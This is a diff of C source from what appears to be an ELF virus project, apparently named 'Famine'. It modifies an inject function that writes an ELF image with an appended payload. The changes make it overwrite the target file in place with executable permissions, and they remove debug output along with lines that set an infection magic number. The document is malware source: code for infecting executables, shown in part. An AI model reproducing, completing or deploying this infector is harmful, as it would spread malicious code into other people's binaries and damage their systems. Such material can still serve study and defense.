@@ -11,7 +11,7 @@ static inline void defer(int *fd)
 
 static void write_on_memory(const struct elf *file, char *ptr)
 {
-	size_t index = 0;
+	register unsigned long index = 0;
 	char *dst = ptr;
 	char *src = file->ptr;
 	
@@ -36,26 +36,15 @@ static void write_on_memory(const struct elf *file, char *ptr)
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void inject(const struct elf *file)
+void inject(const struct elf *file, const char *filename)
 {
 	__attribute__((cleanup(defer))) int fd = 0;
 	char *ptr;
 
-	file->header->e_shoff += (PAYLOAD_SIZE + 0xFD0);
-	*(uint32_t *)&file->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
-
-	printf("Ready to inject\n\n"); // DEBUG
-
-	if ((fd = _open("tmp_famine", O_RDWR | O_CREAT | O_TRUNC, 0700)) == -1)
-	{
-		printf("Failed to open\n"); // DEBUG;
+	if ((fd = _open(filename, O_RDWR | O_CREAT | O_TRUNC, 0744)) == -1)
 		return ;
-	}
 	if ((ptr = _mmap(NULL, file->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
-	{
-		printf("Failed to mmap\n"); // DEBUG
 		return ;
-	}
 
 	write_on_memory(file, ptr);
 	_write(fd, ptr, file->note->p_offset + PAYLOAD_SIZE);
